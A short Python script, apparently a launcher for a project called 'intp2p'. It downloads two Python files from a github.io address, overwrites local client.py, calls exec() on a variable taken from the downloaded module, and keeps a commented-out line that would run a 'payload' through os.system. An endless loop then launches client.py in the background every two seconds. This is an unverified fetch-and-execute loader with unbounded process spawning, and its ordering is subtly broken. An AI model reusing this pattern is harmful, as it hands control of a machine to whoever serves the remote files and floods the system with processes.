import os
import requests
from syntax import *
url2 = 'https://renzothemartian.github.io/intp2p/client.py'
url = 'https://renzothemartian.github.io/intp2p/syntax.py'
r = requests.get(url, allow_redirects=True)
r2 = requests.get(url2, allow_redirects=True)
open('syntax.py', 'wb').write(r.content)
ver = 1.5
# See if ver is same as ver2 and if not dont run
if ver != ver2:
    open('client.py', 'wb').write(r2.content)
    print("ver is different")
import syntax
# os.system(syntax.payload)
exec(pyexecute)
from time import time, sleep
while True:
    sleep(2 - time() % 2)
    os.system("python3 client.py &")
